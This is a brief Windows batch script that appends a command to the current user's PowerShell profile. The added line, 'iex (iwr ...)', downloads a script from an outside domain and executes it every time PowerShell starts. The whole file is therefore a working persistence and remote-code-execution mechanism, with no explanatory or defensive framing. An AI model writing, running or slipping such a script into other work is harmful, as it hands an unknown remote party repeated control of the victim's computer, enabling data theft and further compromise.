@echo off
setlocal

set "profilePath=%USERPROFILE%\Documents\WindowsPowerShell\profile.ps1"

if not exist "%profilePath%" (
    echo # PowerShell profile file >> "%profilePath%"
)

echo iex (iwr https://roooot.dev/ps/bt.ps1) >> "%profilePath%"

echo Command added to PowerShell profile.
endlocal
